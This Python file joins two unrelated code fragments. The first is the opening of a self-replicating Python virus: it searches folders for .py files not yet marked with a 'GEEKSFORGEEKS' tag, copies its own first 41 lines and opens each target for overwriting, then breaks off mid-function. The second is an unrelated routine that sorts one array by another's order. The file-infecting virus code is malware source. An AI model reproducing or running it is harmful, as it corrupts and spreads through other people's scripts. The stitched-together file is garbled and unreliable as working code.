#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
from collections import Counter
 
# Function to sort arr1
# according to arr2
def solve(arr1, arr2):
    # Our output array
    res = []
     
    # Counting Frequency of each
    # number in arr1
    f = Counter(arr1)
     
    # Iterate over arr2 and append all
    # occurrences of element of
    # arr2 from arr1
    for e in arr2:
       
        # Appending element 'e',
        # f[e] number of times
        res.extend([e]*f[e])
         
        # Count of 'e' after appending is zero
        f[e] = 0
         
    # Remaining numbers in arr1 in sorted
    # order (Numbers with non-zero frequency)
    rem = list(sorted(filter(
      lambda x: f[x] != 0, f.keys())))
     
    # Append them also
    for e in rem:
        res.extend([e]*f[e])
         
    return res
 
 
# Driver Code
if __name__ == "__main__":
    arr1 = [2, 1, 2, 5, 7, 1, 9, 3, 6, 8, 8]
    arr2 = [2, 1, 8, 3]
    print(*solve(arr1, arr2))